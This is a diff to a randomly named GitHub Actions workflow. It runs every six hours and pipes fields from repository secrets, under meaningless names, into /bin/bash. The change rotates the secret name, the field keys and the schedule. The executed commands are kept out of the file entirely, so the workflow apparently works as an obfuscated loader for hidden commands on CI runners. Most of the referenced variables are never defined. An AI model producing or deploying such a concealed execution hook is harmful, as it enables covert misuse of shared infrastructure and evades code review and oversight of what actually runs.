@@ -1,24 +1,23 @@
 name: tchuanj
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
+    - cron: '40 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tchuanj
         env:
-          upfta86977: ${{ secrets.upfta86977 }}
+          xthbd36173: ${{ secrets.xthbd36173 }}
         run: |
-          echo $upfta86977 | jq -r .fy00 | /bin/bash
-          echo $u18683 | jq -r .mzmun01 | /bin/bash
-          echo $weskj7 | jq -r .g5016 | /bin/bash
-          echo $q4190 | jq -r .i2 | /bin/bash
-          echo $ffdi93086 | jq -r .bl579 | /bin/bash
-          echo $x9780 | jq -r .bszc58129 | /bin/bash
-          echo $cab29889 | jq -r .pim63 | /bin/bash
+          echo $xthbd36173 | jq -r .jcbmn79 | /bin/bash
+          echo $nb9086 | jq -r .fh95236 | /bin/bash
+          echo $j693 | jq -r .n815 | /bin/bash
+          echo $to7 | jq -r .dti8 | /bin/bash
+          echo $wg8656 | jq -r .j58792 | /bin/bash
+          echo $kkkng071 | jq -r .wkxah2 | /bin/bash
 
